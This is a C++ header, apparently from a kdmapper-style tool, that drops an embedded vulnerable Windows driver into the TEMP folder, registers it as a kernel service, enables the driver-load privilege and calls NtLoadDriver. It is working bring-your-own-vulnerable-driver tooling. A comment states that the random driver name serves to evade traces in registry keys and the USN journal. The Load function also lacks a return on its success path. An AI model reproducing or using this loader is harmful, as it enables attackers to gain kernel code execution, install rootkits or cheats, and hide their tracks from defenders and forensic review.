#pragma once

#include <iostream>
#include <Windows.h>
#include <fstream>
#include "nt.hpp"
#include "driver_data.h"

#define Log(content) std::wcout << content
static char driver_name[100] = {};

static std::wstring GetDriverNameW();

static bool RegisterAndStart(const std::wstring& driver_path) {
	const static DWORD ServiceTypeKernel = 1;
	const std::wstring driver_name = GetDriverNameW();
	const std::wstring servicesPath = L"SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
	const std::wstring nPath = L"\\??\\" + driver_path;

	HKEY dservice;
	LSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice); //Returns Ok if already exists
	if (status != ERROR_SUCCESS) {
		Log("[-] Can't create service key" << std::endl);
		return false;
	}

	status = RegSetKeyValueW(dservice, NULL, L"ImagePath", REG_EXPAND_SZ, nPath.c_str(), (DWORD)(nPath.size() * sizeof(wchar_t)));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'ImagePath' registry value" << std::endl);
		return false;
	}

	status = RegSetKeyValueW(dservice, NULL, L"Type", REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));
	if (status != ERROR_SUCCESS) {
		RegCloseKey(dservice);
		Log("[-] Can't create 'Type' registry value" << std::endl);
		return false;
	}

	RegCloseKey(dservice);

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return false;
	}

	auto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
	auto NtLoadDriver = (nt::NtLoadDriver)GetProcAddress(ntdll, "NtLoadDriver");

	ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	NTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator." << std::endl);
		return false;
	}

	std::wstring wdriver_reg_path = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driver_name;
	UNICODE_STRING serviceStr;
	RtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());

	Status = NtLoadDriver(&serviceStr);
	Log("[+] NtLoadDriver Status 0x" << std::hex << Status << std::endl);

	//Never should occur since kdmapper checks for "IsRunning" driver before
	if (Status == 0xC000010E) {// STATUS_IMAGE_ALREADY_LOADED
		return true;
	}

	return NT_SUCCESS(Status);
}

static bool CreateFileFromMemory(const std::wstring& desired_file_path, const char* address, size_t size) {
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size)) {
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}

std::wstring GetFullTempPath() {
	wchar_t temp_directory[MAX_PATH + 1] = { 0 };
	const uint32_t get_temp_path_ret = GetTempPathW(sizeof(temp_directory) / 2, temp_directory);
	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1) {
		Log(L"[-] Failed to get temp path" << std::endl);
		return L"";
	}
	if (temp_directory[wcslen(temp_directory) - 1] == L'\\')
		temp_directory[wcslen(temp_directory) - 1] = 0x0;

	return std::wstring(temp_directory);
}

static std::wstring GetDriverNameW() {
	std::string t(driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

static std::wstring GetDriverPath() {
	std::wstring temp = GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}


static HANDLE Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(driver_name, 0, sizeof(driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driver_data), sizeof(driver_data))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!RegisterAndStart(driver_path)) {
		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}
}
